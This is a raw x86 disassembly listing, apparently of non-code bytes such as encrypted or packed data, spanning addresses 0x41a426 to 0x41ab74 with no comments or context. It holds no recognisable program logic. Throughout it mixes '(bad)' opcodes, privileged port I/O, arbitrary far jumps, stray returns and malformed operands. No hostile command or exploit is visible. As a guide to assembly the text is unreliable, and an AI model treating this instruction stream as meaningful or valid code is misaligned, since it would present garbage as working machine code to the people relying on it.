  41a426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a427:	or     DWORD PTR [ecx],0xe8c63884
  41a42d:	jp     0x41a424
  41a42f:	sub    al,BYTE PTR [eax+0x57c869f1]
  41a435:	fmul   DWORD PTR [ebp+eiz*1+0x34ca61a6]
  41a43c:	test   eax,0x222f0b04
  41a441:	mov    bl,bh
  41a443:	cmp    ch,BYTE PTR [ebx+0x41]
  41a446:	mov    edx,0x3f10e93d
  41a44b:	nop
  41a44c:	add    ah,BYTE PTR [ecx+0x77]
  41a44f:	cmp    dh,ah
  41a451:	ficom  DWORD PTR [edi-0x30672419]
  41a457:	ret    
  41a458:	sub    eax,0xe5c2e0bc
  41a45d:	jbe    0x41a485
  41a45f:	stos   DWORD PTR es:[edi],eax
  41a460:	fucomi st,st(7)
  41a462:	les    eax,FWORD PTR [ebp-0x7db456cb]
  41a468:	test   BYTE PTR [ebx],al
  41a46a:	xor    DWORD PTR [ecx-0x35d9f0d2],ecx
  41a470:	pop    eax
  41a471:	jl     0x41a470
  41a473:	mov    edx,0x1b3b486c
  41a478:	sbb    BYTE PTR [eax],ch
  41a47a:	sbb    DWORD PTR [ebp+0x12cfb7c1],ebp
  41a480:	shl    BYTE PTR [ebx-0x6b],cl
  41a483:	xchg   ecx,eax
  41a484:	mov    bl,0x4b
  41a486:	cmc    
  41a487:	call   0x23a9:0x1910ecee
  41a48e:	or     BYTE PTR [esi+ebp*4],ch
  41a491:	int    0x6e
  41a493:	and    BYTE PTR [edx-0x4648c230],0x89
  41a49a:	mov    esi,0x23fa656c
  41a49f:	mov    edx,0x76de5e20
  41a4a4:	int3   
  41a4a5:	xor    edx,DWORD PTR [ebp-0x6abbdc59]
  41a4ab:	xor    BYTE PTR [ebp-0x2c],cl
  41a4ae:	mov    esp,0xa8003b1d
  41a4b3:	leave  
  41a4b4:	out    0x90,eax
  41a4b6:	aas    
  41a4b7:	imul   edx,edx,0xa07136ef
  41a4bd:	test   bh,0x45
  41a4c0:	aam    0x6f
  41a4c2:	cld    
  41a4c3:	popa   
  41a4c4:	aaa    
  41a4c5:	or     edi,DWORD PTR [ebp+0x2a]
  41a4c8:	push   es
  41a4c9:	add    DWORD PTR [ecx],edi
  41a4cb:	and    eax,0x2e13f47b
  41a4d0:	(bad)  
  41a4d2:	or     al,0x81
  41a4d4:	fwait
  41a4d5:	pop    eax
  41a4d6:	push   ebp
  41a4d7:	pop    es
  41a4d8:	sub    esi,eax
  41a4da:	nop
  41a4db:	cmp    eax,0xf9a5c3a0
  41a4e0:	popf   
  41a4e1:	dec    eax
  41a4e2:	xchg   ecx,eax
  41a4e3:	push   ecx
  41a4e4:	mov    ebx,0xb8581f25
  41a4e9:	data16 mov dh,0x34
  41a4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4ed:	ret    
  41a4ee:	push   es
  41a4ef:	retf   
  41a4f0:	fsub   QWORD PTR [edx-0x401032ba]
  41a4f6:	test   BYTE PTR [edx+0x56a449f0],cl
  41a4fc:	sbb    eax,0xeeaa85f3
  41a501:	mov    ch,0xb2
  41a503:	fiadd  DWORD PTR [esp+edx*4-0x61]
  41a507:	div    edx
  41a509:	jmp    0xf2ec:0xa433e1fb
  41a510:	out    0xd0,eax
  41a512:	sub    ch,BYTE PTR [esi+0x17]
  41a515:	xchg   ecx,eax
  41a516:	lods   eax,DWORD PTR ds:[esi]
  41a517:	sbb    BYTE PTR [ebx],cl
  41a519:	scas   al,BYTE PTR es:[edi]
  41a51a:	mov    ch,0x11
  41a51c:	and    ebp,esp
  41a51e:	pop    edi
  41a51f:	jo     0x41a581
  41a521:	cmp    BYTE PTR [ecx+edi*4+0xe],0xde
  41a526:	in     al,dx
  41a527:	ds pop ebp
  41a529:	mov    eax,ds:0xd85cfd7a
  41a52e:	or     BYTE PTR [ecx-0x1b],dl
  41a531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a532:	cmp    eax,0x7f0cf7cd
  41a537:	enter  0xc005,0x77
  41a53b:	bound  ebp,QWORD PTR [edi+ebp*8+0x2c]
  41a53f:	xlat   BYTE PTR ds:[ebx]
  41a540:	push   es
  41a541:	jns    0x41a509
  41a543:	and    bh,cl
  41a545:	ror    DWORD PTR [ebx],0x44
  41a548:	cmp    eax,0xd122e394
  41a54d:	pushf  
  41a54e:	stc    
  41a54f:	pop    eax
  41a550:	mov    bl,0xd2
  41a552:	jae    0x41a4f7
  41a554:	jo     0x41a519
  41a556:	and    dl,BYTE PTR [edx]
  41a558:	jp     0x41a584
  41a55a:	stos   BYTE PTR es:[edi],al
  41a55b:	jg     0x41a505
  41a55d:	scas   al,BYTE PTR es:[edi]
  41a55e:	pop    eax
  41a55f:	shr    DWORD PTR [ebx],1
  41a561:	mov    bh,0xc7
  41a563:	out    0x1f,eax
  41a565:	scas   eax,DWORD PTR es:[edi]
  41a566:	mov    ebx,0x49874604
  41a56b:	pop    ebp
  41a56c:	xchg   ebp,eax
  41a56d:	and    DWORD PTR [edi],ebp
  41a56f:	dec    ebx
  41a570:	ret    
  41a571:	loop   0x41a517
  41a573:	push   ebp
  41a574:	sub    al,BYTE PTR [edx-0x5e9b3223]
  41a57a:	jp     0x41a5c5
  41a57c:	sbb    edi,edi
  41a57e:	fcmovbe st,st(5)
  41a580:	stc    
  41a581:	not    BYTE PTR [ebx-0x428fa8d3]
  41a587:	adc    eax,0x1f7a22d9
  41a58c:	nop
  41a58d:	cmp    BYTE PTR [esi+0x526820a0],cl
  41a593:	push   0x75
  41a595:	push   es
  41a596:	jae    0x41a593
  41a598:	scas   al,BYTE PTR es:[edi]
  41a599:	repnz push edi
  41a59b:	ins    DWORD PTR es:[edi],dx
  41a59c:	outs   dx,DWORD PTR ds:[esi]
  41a59d:	dec    edi
  41a59e:	iret   
  41a59f:	sbb    esi,edi
  41a5a1:	xchg   ebx,eax
  41a5a2:	test   al,0x5c
  41a5a4:	sti    
  41a5a5:	(bad)  ds:0xe9ed9500
  41a5ab:	mov    esp,0xe5dd12c8
  41a5b0:	mov    al,ds:0x19e33a46
  41a5b5:	sti    
  41a5b6:	add    BYTE PTR [eax],bh
  41a5b8:	push   esi
  41a5b9:	fld    QWORD PTR [ebp+0x4355cbef]
  41a5bf:	shl    ebx,0x4e
  41a5c2:	arpl   WORD PTR [ebx+0x2d],sp
  41a5c5:	lahf   
  41a5c6:	xchg   DWORD PTR [esi+0x71e1953f],ebp
  41a5cc:	inc    esi
  41a5cd:	fiadd  WORD PTR [esi+edi*8+0x12]
  41a5d1:	xchg   esp,eax
  41a5d2:	inc    eax
  41a5d3:	repnz in al,dx
  41a5d5:	xor    edx,DWORD PTR [edx+0x71]
  41a5d8:	jbe    0x41a60b
  41a5da:	sub    eax,0x8bb82f90
  41a5df:	pushf  
  41a5e0:	jb     0x41a5aa
  41a5e2:	repz es out dx,al
  41a5e5:	nop
  41a5e6:	push   0xffffffff
  41a5e8:	mov    ecx,0xe7960ed2
  41a5ed:	lods   al,BYTE PTR ds:[esi]
  41a5ee:	stos   BYTE PTR es:[edi],al
  41a5ef:	fsubr  DWORD PTR [ecx-0x7278c0bb]
  41a5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f6:	dec    esi
  41a5f7:	mov    esp,0xa091742e
  41a5fc:	and    edx,esi
  41a5fe:	mov    WORD PTR [edi],es
  41a600:	rcr    BYTE PTR [ebx],cl
  41a602:	call   0xc76caf89
  41a607:	pusha  
  41a608:	cmp    esi,DWORD PTR [edx-0x74]
  41a60b:	lds    ebp,FWORD PTR [ebp+0x66]
  41a60e:	pop    esi
  41a60f:	enter  0x6541,0x6a
  41a613:	scas   eax,DWORD PTR es:[edi]
  41a614:	push   ds
  41a615:	cdq    
  41a616:	ret    
  41a617:	xchg   esi,eax
  41a618:	jbe    0x41a679
  41a61a:	cmc    
  41a61b:	in     eax,0x96
  41a61d:	jge    0x41a613
  41a61f:	shl    DWORD PTR [ecx+0xd],0xef
  41a623:	pop    eax
  41a624:	cmp    eax,0x15ec3f1c
  41a629:	out    0x3,eax
  41a62b:	scas   al,BYTE PTR es:[edi]
  41a62c:	dec    ebp
  41a62d:	cmc    
  41a62e:	arpl   bp,cx
  41a630:	jne    0x41a5c0
  41a632:	dec    ecx
  41a633:	dec    edx
  41a634:	mov    ch,0x7a
  41a636:	out    0x9d,al
  41a638:	ficom  WORD PTR [esi+0x71]
  41a63b:	aam    0xf4
  41a63d:	hlt    
  41a63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a63f:	loop   0x41a611
  41a641:	add    edi,DWORD PTR [ebp-0x68]
  41a644:	adc    BYTE PTR [eax-0x35],ch
  41a647:	std    
  41a648:	rol    BYTE PTR [eax+edx*4],1
  41a64b:	or     ch,BYTE PTR [ebx-0x683bcaa6]
  41a651:	add    BYTE PTR [ebx+0x44c22c35],cl
  41a657:	xchg   esp,eax
  41a658:	loope  0x41a6cb
  41a65a:	icebp  
  41a65b:	pushf  
  41a65c:	ins    DWORD PTR es:[edi],dx
  41a65d:	push   esp
  41a65e:	out    0xf5,eax
  41a660:	mov    al,0xe6
  41a662:	dec    esi
  41a663:	in     eax,dx
  41a664:	add    ebx,0x0
  41a667:	mov    eax,0x38245f88
  41a66c:	fld    TBYTE PTR [edx]
  41a66e:	fwait
  41a66f:	pop    fs
  41a671:	xchg   BYTE PTR [esi+0x10],ch
  41a674:	xchg   ebx,eax
  41a675:	lock fdiv QWORD PTR [ebx+0x7d]
  41a679:	lods   eax,DWORD PTR ds:[esi]
  41a67a:	jne    0x41a611
  41a67c:	retf   
  41a67d:	push   0x3bed0c13
  41a682:	xchg   ebp,eax
  41a683:	sub    eax,DWORD PTR [edx-0x29]
  41a686:	mov    bh,0xa5
  41a688:	leave  
  41a689:	xchg   ebp,eax
  41a68a:	stc    
  41a68b:	mov    al,ds:0xc23c35e8
  41a690:	pop    ss
  41a691:	xor    dh,BYTE PTR [esi-0x42a93597]
  41a697:	jge    0x41a638
  41a699:	push   esp
  41a69a:	bound  edx,QWORD PTR [ebp+0x55]
  41a69d:	pop    ss
  41a69e:	ret    
  41a69f:	(bad)  
  41a6a0:	test   al,0xb2
  41a6a2:	fsubr  QWORD PTR [edi+0x5a4ea02b]
  41a6a8:	repz push cs
  41a6aa:	pop    esi
  41a6ab:	cmp    eax,0x42d0cea7
  41a6b0:	xchg   edx,eax
  41a6b1:	xchg   ebp,eax
  41a6b2:	or     BYTE PTR [ecx],cl
  41a6b4:	shl    DWORD PTR [edx-0x5f],cl
  41a6b7:	clc    
  41a6b8:	mov    esp,DWORD PTR [edi]
  41a6ba:	mov    ds:0x10f8f517,eax
  41a6bf:	mov    ebp,DWORD PTR [edi]
  41a6c1:	dec    ebx
  41a6c2:	ret    
  41a6c3:	jnp    0x41a68b
  41a6c5:	fstp   st(3)
  41a6c7:	adc    esp,DWORD PTR [ecx]
  41a6c9:	jmp    0x3290ce4a
  41a6ce:	push   ds
  41a6cf:	leave  
  41a6d0:	push   cs
  41a6d1:	pop    ecx
  41a6d2:	retf   
  41a6d3:	mov    DWORD PTR [esi+0x2e],eax
  41a6d6:	mov    dh,0x14
  41a6d8:	xchg   ecx,eax
  41a6d9:	fidivr WORD PTR [ebx]
  41a6db:	lahf   
  41a6dc:	xchg   ebx,eax
  41a6dd:	and    eax,0xa35c7d34
  41a6e2:	sbb    ecx,DWORD PTR [ebp-0x27]
  41a6e5:	jl     0x41a745
  41a6e7:	je     0x41a754
  41a6e9:	cmp    ecx,esi
  41a6eb:	sbb    esp,DWORD PTR [esi+ebx*2-0x632b3482]
  41a6f2:	fsub   QWORD PTR [edx-0x6d7dd864]
  41a6f8:	sbb    eax,0xac3780e9
  41a6fd:	mov    eax,0x2650f35c
  41a702:	inc    eax
  41a703:	inc    eax
  41a704:	lds    ebx,FWORD PTR [ebx+edi*8-0x48]
  41a708:	xchg   edx,eax
  41a709:	pop    ebx
  41a70a:	leave  
  41a70b:	pop    ss
  41a70c:	push   edx
  41a70d:	or     bl,0x83
  41a710:	iret   
  41a711:	pushf  
  41a712:	push   ebx
  41a713:	test   BYTE PTR [esi+eiz*2+0x3a],dh
  41a717:	in     eax,0xa1
  41a719:	dec    ebx
  41a71a:	xchg   edx,eax
  41a71b:	mov    ds:0x55e3e8e3,al
  41a720:	sub    eax,0x537f880d
  41a725:	push   esi
  41a726:	pop    ds
  41a727:	iret   
  41a728:	stos   BYTE PTR es:[edi],al
  41a729:	loope  0x41a725
  41a72b:	fnstenv [ebp-0x6bd2d47b]
  41a731:	and    al,ah
  41a733:	sub    ecx,DWORD PTR [esi-0x6c]
  41a736:	mov    dh,0x85
  41a738:	shl    DWORD PTR [ecx],1
  41a73a:	(bad)  
  41a73b:	jg     0x41a74b
  41a73d:	mov    ch,0x60
  41a73f:	adc    al,0x27
  41a741:	adc    eax,0x115719e1
  41a746:	mov    ecx,0xcd32f33f
  41a74b:	ret    0x7bb4
  41a74e:	sbb    cl,BYTE PTR [ecx]
  41a750:	repnz rol DWORD PTR [esi+0x47b5f277],cl
  41a757:	lahf   
  41a758:	sub    ebp,DWORD PTR [eax-0x7e]
  41a75b:	xor    edx,edx
  41a75d:	test   al,0x2c
  41a75f:	ret    
  41a760:	and    eax,0x828240bd
  41a765:	test   ah,bh
  41a767:	call   0x6893440f
  41a76c:	clc    
  41a76d:	js     0x41a7cd
  41a76f:	pop    ds
  41a770:	js     0x41a795
  41a772:	fadd   QWORD PTR [esi-0x57]
  41a775:	dec    ebp
  41a776:	pop    es
  41a777:	push   0x26847118
  41a77c:	lahf   
  41a77d:	mov    esi,ebx
  41a77f:	sti    
  41a780:	push   edx
  41a781:	in     eax,dx
  41a782:	ret    
  41a783:	das    
  41a784:	xor    edx,DWORD PTR [esi+0x1cd11476]
  41a78a:	in     al,dx
  41a78b:	mov    esp,0x27ea5161
  41a790:	add    BYTE PTR [esi+ebp*2+0x4e],ah
  41a794:	std    
  41a795:	push   esi
  41a796:	test   BYTE PTR [eax-0x7347a96d],dl
  41a79c:	push   0x891d9bd8
  41a7a1:	and    ecx,esi
  41a7a3:	leave  
  41a7a4:	int3   
  41a7a5:	mov    dl,0x25
  41a7a7:	je     0x41a796
  41a7a9:	inc    esp
  41a7aa:	scas   eax,DWORD PTR es:[edi]
  41a7ab:	in     eax,0xd8
  41a7ad:	loopne 0x41a7a8
  41a7af:	dec    esi
  41a7b0:	jl     0x41a757
  41a7b2:	outs   dx,BYTE PTR ds:[esi]
  41a7b3:	std    
  41a7b4:	dec    ecx
  41a7b5:	or     ebx,edi
  41a7b7:	jmp    0x1b04:0xf5f50b27
  41a7be:	mov    ss,WORD PTR [esi]
  41a7c0:	xchg   esp,eax
  41a7c1:	dec    ecx
  41a7c2:	adc    BYTE PTR [ebp+0x36],dh
  41a7c5:	icebp  
  41a7c6:	lods   al,BYTE PTR ds:[esi]
  41a7c7:	aaa    
  41a7c8:	stos   DWORD PTR es:[edi],eax
  41a7c9:	xchg   DWORD PTR [edi+0x76],edi
  41a7cc:	pusha  
  41a7cd:	les    edx,FWORD PTR [ecx+0x55d99226]
  41a7d3:	or     eax,0x1a090035
  41a7d8:	nop
  41a7d9:	jb     0x41a788
  41a7db:	cld    
  41a7dc:	out    dx,al
  41a7dd:	mov    WORD PTR [bx+di+0x4138],cs
  41a7e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7e3:	adc    BYTE PTR [eax-0x57068944],cl
  41a7e9:	ret    
  41a7ea:	jecxz  0x41a7b4
  41a7ec:	in     al,dx
  41a7ed:	arpl   WORD PTR [edx-0x64776360],di
  41a7f3:	nop
  41a7f4:	mov    esp,0x4b3531f8
  41a7f9:	call   FWORD PTR [eax+edi*1]
  41a7fc:	ror    BYTE PTR [edx+0x39],cl
  41a7ff:	repz add esi,0xffffff9c
  41a803:	push   ebx
  41a804:	lea    ebp,[esi]
  41a806:	push   ebx
  41a807:	mov    BYTE PTR [eax+0x70e080df],ah
  41a80d:	cmp    BYTE PTR [ebp+0x449b976c],ah
  41a813:	int3   
  41a814:	pop    es
  41a815:	push   ss
  41a816:	in     eax,0x6c
  41a818:	or     al,0x57
  41a81a:	sub    eax,0xe5c930f4
  41a81f:	inc    ebp
  41a820:	or     al,0x18
  41a822:	in     eax,0x17
  41a824:	pop    esi
  41a825:	pop    edx
  41a826:	ja     0x41a7df
  41a828:	(bad)  
  41a829:	psubsw mm5,QWORD PTR es:[esi+0x79b11760]
  41a831:	pop    es
  41a832:	outs   dx,DWORD PTR ds:[esi]
  41a833:	inc    ecx
  41a834:	cmc    
  41a835:	inc    esp
  41a836:	mov    esi,0x3d260743
  41a83b:	mov    esp,DWORD PTR [ecx+0x22cdd46f]
  41a841:	or     BYTE PTR [eax],bl
  41a843:	sbb    eax,0x4c654b03
  41a848:	rol    BYTE PTR [ecx+ebp*2+0x5d],0xa
  41a84d:	xchg   ebx,eax
  41a84e:	mov    esi,0xbfb1d4ee
  41a853:	mov    esi,0x12a0f6cf
  41a858:	arpl   WORD PTR [edx+0x55643d30],bp
  41a85e:	out    dx,al
  41a85f:	pop    ebp
  41a860:	mov    ebp,0xc4215e84
  41a865:	jp     0x41a867
  41a867:	int    0xf1
  41a869:	xchg   BYTE PTR [edx+ebx*8],ah
  41a86c:	adc    DWORD PTR [ebx],esi
  41a86e:	mov    edx,0x17f82e3b
  41a873:	adc    al,0x70
  41a875:	jno    0x41a81f
  41a877:	pop    edx
  41a878:	fidiv  WORD PTR [edi+0x3c55feb4]
  41a87e:	sub    eax,0x7225306f
  41a883:	or     ah,ah
  41a885:	std    
  41a886:	stos   DWORD PTR es:[edi],eax
  41a887:	jae    0x41a877
  41a889:	jecxz  0x41a850
  41a88b:	dec    esp
  41a88c:	cmc    
  41a88d:	fwait
  41a88e:	(bad)  
  41a88f:	das    
  41a890:	out    dx,eax
  41a891:	scas   eax,DWORD PTR es:[edi]
  41a892:	in     eax,0xa0
  41a894:	mov    ch,0x5d
  41a896:	xor    eax,0x5dc98039
  41a89b:	adc    ebp,DWORD PTR [ecx+0x682f0d30]
  41a8a1:	lds    esi,FWORD PTR [ebx+0x459abd13]
  41a8a7:	mov    ebx,0x2c0f5054
  41a8ac:	dec    esp
  41a8ad:	aas    
  41a8ae:	dec    ebx
  41a8af:	jno    0x41a84a
  41a8b1:	lds    edx,FWORD PTR [ebx+0x57]
  41a8b4:	cs jmp 0x41a921
  41a8b7:	jl     0x41a86d
  41a8b9:	iret   
  41a8ba:	cmp    DWORD PTR [ebx-0x2fa26dcd],ecx
  41a8c0:	xor    al,0xe3
  41a8c2:	mov    esi,eax
  41a8c4:	push   ds
  41a8c5:	xor    BYTE PTR [esi-0x495c864],0xc3
  41a8cc:	xchg   ebp,eax
  41a8cd:	dec    edi
  41a8ce:	cmp    DWORD PTR [esi],edx
  41a8d0:	sbb    bh,BYTE PTR [ebx+eax*4+0x4713e6e4]
  41a8d7:	dec    ebp
  41a8d8:	aaa    
  41a8d9:	int    0x53
  41a8db:	jmp    0x41a8fe
  41a8dd:	mov    al,0x4b
  41a8df:	mov    edx,0x84929990
  41a8e4:	xchg   BYTE PTR [edi+0x13],cl
  41a8e7:	mov    WORD PTR [esi+esi*4],?
  41a8ea:	mov    WORD PTR [edi-0x39],cs
  41a8ed:	rol    ebx,0x56
  41a8f0:	outs   dx,BYTE PTR ds:[esi]
  41a8f1:	pop    ecx
  41a8f2:	fwait
  41a8f3:	push   ebx
  41a8f4:	popf   
  41a8f5:	inc    eax
  41a8f6:	cwde   
  41a8f7:	retf   0x29e4
  41a8fa:	lock dec ebx
  41a8fc:	not    dl
  41a8fe:	pop    ss
  41a8ff:	adc    al,0x9a
  41a901:	inc    edx
  41a902:	and    eax,0xb601884a
  41a907:	sub    ch,BYTE PTR [eax]
  41a909:	xchg   ebp,edx
  41a90b:	sub    BYTE PTR [edx+ebp*4+0x51],ah
  41a90f:	test   edx,edx
  41a911:	adc    edx,DWORD PTR [ecx]
  41a913:	jl     0x41a896
  41a915:	or     eax,0xeefd6125
  41a91a:	sub    eax,0xbf0a4c
  41a91f:	pop    ss
  41a920:	inc    edi
  41a921:	mov    al,ds:0x551a1138
  41a926:	xor    ch,BYTE PTR [edi+0x7c]
  41a929:	jge    0x41a8df
  41a92b:	cmp    ebp,DWORD PTR [edx+0x68e90a6]
  41a931:	inc    esp
  41a932:	popa   
  41a933:	sahf   
  41a934:	mov    edx,0x5b9cc891
  41a939:	pop    edx
  41a93a:	ins    DWORD PTR es:[edi],dx
  41a93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a93c:	add    al,0x7d
  41a93e:	mov    al,0x9b
  41a940:	inc    ebp
  41a941:	mov    BYTE PTR [ebp+0x2d3b2a81],al
  41a947:	xchg   ecx,eax
  41a948:	or     BYTE PTR [edi-0x418e470a],bl
  41a94e:	addr16 in eax,0xb8
  41a951:	es jne 0x41a944
  41a954:	cwde   
  41a955:	leave  
  41a956:	lea    eax,[ecx+0x774e9c7]
  41a95c:	rcl    DWORD PTR [ecx],1
  41a95e:	and    BYTE PTR [ebx+0x469b2102],ah
  41a964:	popa   
  41a965:	imul   ebx,DWORD PTR [edi],0x7665c94
  41a96b:	jne    0x41a9a5
  41a96d:	icebp  
  41a96e:	adc    dh,dh
  41a970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a971:	adc    BYTE PTR [ecx-0x5],dl
  41a974:	jmp    0xbd1f:0x9e98d163
  41a97b:	or     eax,0x61941526
  41a980:	in     eax,dx
  41a981:	xor    eax,0x78a5dffc
  41a986:	lods   al,BYTE PTR ds:[esi]
  41a987:	fldenv [eax-0x2a]
  41a98a:	je     0x41a9a9
  41a98c:	data16 xlat BYTE PTR ds:[ebx]
  41a98e:	je     0x41a9b6
  41a990:	imul   edi,DWORD PTR ds:0x6e6c74e0,0xffffff85
  41a997:	jecxz  0x41a9ec
  41a999:	jno    0x41a9da
  41a99b:	or     BYTE PTR [ebx-0x196559d4],bh
  41a9a1:	inc    ebx
  41a9a2:	adc    eax,0x58ff9510
  41a9a7:	popa   
  41a9a8:	inc    ebx
  41a9a9:	mov    ebp,0xf256e7f7
  41a9ae:	sub    BYTE PTR [ecx-0x21],ch
  41a9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b2:	add    eax,0x8ea94f22
  41a9b7:	out    0x2f,eax
  41a9b9:	mov    esi,0xe343457f
  41a9be:	lock mov ebx,0x277ca313
  41a9c4:	test   al,0x83
  41a9c6:	xor    eax,0xd005a2e9
  41a9cb:	pop    ebx
  41a9cc:	dec    ecx
  41a9cd:	mov    cl,0xee
  41a9cf:	clc    
  41a9d0:	es (bad) 
  41a9d2:	out    dx,eax
  41a9d3:	xchg   esi,eax
  41a9d4:	iret   
  41a9d5:	mov    es,WORD PTR [eax+esi*1-0x2cbce5ea]
  41a9dc:	sahf   
  41a9dd:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41a9df:	js     0x41a9ee
  41a9e1:	mov    ah,0x99
  41a9e3:	xchg   BYTE PTR [ebp-0x2c],al
  41a9e6:	adc    esp,DWORD PTR [eax]
  41a9e8:	repnz loope 0x41a9e1
  41a9eb:	push   ecx
  41a9ec:	retf   0x3b9a
  41a9ef:	pop    esp
  41a9f0:	and    DWORD PTR ds:0xc078d686,edi
  41a9f6:	repnz cmp bh,BYTE PTR [ecx]
  41a9f9:	sbb    al,0xe0
  41a9fb:	hlt    
  41a9fc:	mov    DWORD PTR [ecx-0x206d7cd3],ebp
  41aa02:	(bad)  
  41aa03:	retf   0xb813
  41aa06:	xchg   ebp,eax
  41aa07:	adc    al,0xf3
  41aa09:	push   0xffffffd7
  41aa0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa0c:	jmp    0xabf935e2
  41aa11:	jne    0x41aa32
  41aa13:	fiadd  DWORD PTR [eax+0x78]
  41aa16:	enter  0xee75,0x59
  41aa1a:	imul   ebp,DWORD PTR [eax],0x4
  41aa1d:	cs ret 0x1e11
  41aa21:	(bad)  
  41aa22:	call   0xdf99:0x6a2a094a
  41aa29:	mov    ?,WORD PTR [esi-0x3fb29cd]
  41aa2f:	jp     0x41a9ce
  41aa31:	in     eax,dx
  41aa32:	sbb    cl,al
  41aa34:	loopne 0x41aa7e
  41aa36:	stos   BYTE PTR es:[edi],al
  41aa37:	pop    ds
  41aa38:	xor    dh,BYTE PTR [ecx]
  41aa3a:	inc    eax
  41aa3b:	in     eax,0x9f
  41aa3d:	shl    BYTE PTR [ecx],cl
  41aa3f:	stos   DWORD PTR es:[edi],eax
  41aa40:	or     ebx,esp
  41aa42:	icebp  
  41aa43:	imul   eax,DWORD PTR [ebx-0x45c6032f],0xb5e89562
  41aa4d:	sahf   
  41aa4e:	fs stos BYTE PTR es:[edi],al
  41aa50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa51:	sub    eax,0x310cdb95
  41aa56:	dec    esp
  41aa57:	jle    0x41aab9
  41aa59:	dec    eax
  41aa5a:	out    dx,al
  41aa5b:	sub    eax,0xca632eb9
  41aa60:	xor    edx,DWORD PTR [ecx]
  41aa62:	ror    eax,1
  41aa64:	mov    ds:0x8d1039a,eax
  41aa69:	scas   eax,DWORD PTR es:[edi]
  41aa6a:	push   esp
  41aa6b:	mov    bh,0x31
  41aa6d:	sbb    DWORD PTR [ebx-0x18],esp
  41aa70:	sbb    ah,ch
  41aa72:	dec    DWORD PTR [esi+ebp*4+0x46]
  41aa76:	add    bh,al
  41aa78:	push   cs
  41aa79:	push   esi
  41aa7a:	sbb    eax,0xfcbafc1f
  41aa7f:	outs   dx,BYTE PTR ds:[esi]
  41aa80:	rcl    DWORD PTR [eax-0x1fed389f],1
  41aa86:	push   esi
  41aa87:	iret   
  41aa88:	ffree  st(5)
  41aa8a:	fcomp  QWORD PTR [ecx-0x53]
  41aa8d:	(bad)  
  41aa8e:	dec    edx
  41aa8f:	fidiv  DWORD PTR [edx]
  41aa91:	mov    eax,ds:0x5c9b1b34
  41aa96:	dec    edi
  41aa97:	std    
  41aa98:	ds mov eax,ebp
  41aa9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa9c:	push   es
  41aa9d:	lods   eax,DWORD PTR ds:[esi]
  41aa9e:	xor    eax,0xcfccd9bb
  41aaa3:	and    eax,0x982a7d2a
  41aaa8:	pop    fs
  41aaaa:	xor    al,0x26
  41aaac:	es cli 
  41aaae:	arpl   cx,si
  41aab0:	or     DWORD PTR [ebp+0x523fae84],0xffffffde
  41aab7:	loop   0x41aa73
  41aab9:	or     edx,DWORD PTR [esi+eiz*2]
  41aabc:	or     edx,DWORD PTR [esi+edx*8-0x43832259]
  41aac3:	dec    ebp
  41aac4:	jg     0x41aaf5
  41aac6:	push   ebx
  41aac7:	mov    eax,ds:0x9055f4e8
  41aacc:	sahf   
  41aacd:	dec    ebp
  41aace:	fiadd  WORD PTR [ebp-0x4]
  41aad1:	xlat   BYTE PTR ds:[ebx]
  41aad2:	ins    BYTE PTR es:[edi],dx
  41aad3:	pop    eax
  41aad4:	ins    DWORD PTR es:[edi],dx
  41aad5:	clc    
  41aad6:	mov    bl,0x87
  41aad8:	fcmovne st,st(7)
  41aada:	leave  
  41aadb:	mov    al,0x26
  41aadd:	lea    esi,[edx-0x147dddb0]
  41aae3:	adc    ch,BYTE PTR [ebx]
  41aae5:	jno    0x41ab5d
  41aae7:	push   ecx
  41aae8:	mov    bl,0x4
  41aaea:	ret    0x86f7
  41aaed:	push   ebp
  41aaee:	xchg   edi,eax
  41aaef:	aaa    
  41aaf0:	mov    bh,BYTE PTR [edx]
  41aaf2:	push   ds
  41aaf3:	lock sub dh,BYTE PTR [ebp+0x36381d16]
  41aafa:	in     eax,0x59
  41aafc:	fst    st(4)
  41aafe:	cmp    edx,DWORD PTR [ebp+0x37]
  41ab01:	bound  esp,QWORD PTR [edi+ecx*4]
  41ab04:	mov    ah,0x47
  41ab06:	mov    ?,WORD PTR [ebx+0x2a]
  41ab09:	dec    edx
  41ab0a:	or     al,0x95
  41ab0c:	aas    
  41ab0d:	or     ecx,DWORD PTR [ebx+0x5b]
  41ab10:	rcr    BYTE PTR [ebp+0x7f],cl
  41ab13:	push   0x506e8f19
  41ab18:	das    
  41ab19:	push   ecx
  41ab1a:	mov    dh,0x84
  41ab1c:	cmp    eax,0xaff15bdb
  41ab21:	jp     0x41ab89
  41ab23:	xor    DWORD PTR [edi+0x30],esp
  41ab26:	(bad)  
  41ab29:	ss cmp eax,0xfa40e6bc
  41ab2f:	shr    ch,0x17
  41ab32:	pop    eax
  41ab33:	push   eax
  41ab34:	and    bl,BYTE PTR [edx-0x12]
  41ab37:	icebp  
  41ab38:	pop    ss
  41ab39:	or     cl,bh
  41ab3b:	mov    WORD PTR [ebp+0x62],ds
  41ab3e:	mov    dl,BYTE PTR [edi+ebx*2-0x7f]
  41ab42:	sbb    dl,ah
  41ab44:	call   0xafad:0xae65dc0b
  41ab4b:	jmp    0x52b5:0x710b8469
  41ab52:	xchg   esi,eax
  41ab53:	mov    dl,0x30
  41ab55:	icebp  
  41ab56:	xchg   esp,eax
  41ab57:	xchg   ebp,eax
  41ab58:	lahf   
  41ab59:	dec    esi
  41ab5a:	jg     0x41aaf3
  41ab5c:	lahf   
  41ab5d:	mov    dh,0xba
  41ab5f:	sbb    eax,0x4f68f8b2
  41ab64:	mov    BYTE PTR [edi-0x59],ch
  41ab67:	sub    bl,BYTE PTR [edi+0x7e]
  41ab6a:	cmp    BYTE PTR [edx+eax*2-0xd629e56],ch
  41ab71:	xchg   edi,eax
  41ab72:	pop    edi
  41ab74:	inc    esp
